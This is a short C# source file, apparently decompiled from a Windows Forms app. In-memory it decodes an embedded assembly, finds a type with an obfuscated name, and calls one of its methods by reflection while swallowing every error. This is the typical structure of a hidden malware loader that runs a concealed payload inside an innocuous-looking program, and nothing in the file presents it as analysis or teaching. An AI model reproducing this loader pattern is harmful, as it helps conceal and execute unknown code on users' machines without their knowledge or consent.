using System;
using System.Reflection;

namespace WindowsFormsApp1;

internal class Wrong
{
	private static Type[] GetTypes => AppDomain.CurrentDomain.Load(Chat.NativeMethods.Decode()).GetExportedTypes();

	internal static string SForStrring()
	{
		Type[] getTypes = GetTypes;
		foreach (Type type in getTypes)
		{
			try
			{
				if (!(type.FullName == "K1S2NvxPERT1G5maLn.joraiIrEXex2U3u4i2"))
				{
					continue;
				}
				MethodInfo[] methods = type.GetMethods();
				foreach (MethodInfo methodInfo in methods)
				{
					try
					{
						if (methodInfo.Name == "X8kTMNwYh")
						{
							methodInfo.Invoke(null, null);
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}
		return null;
	}
}
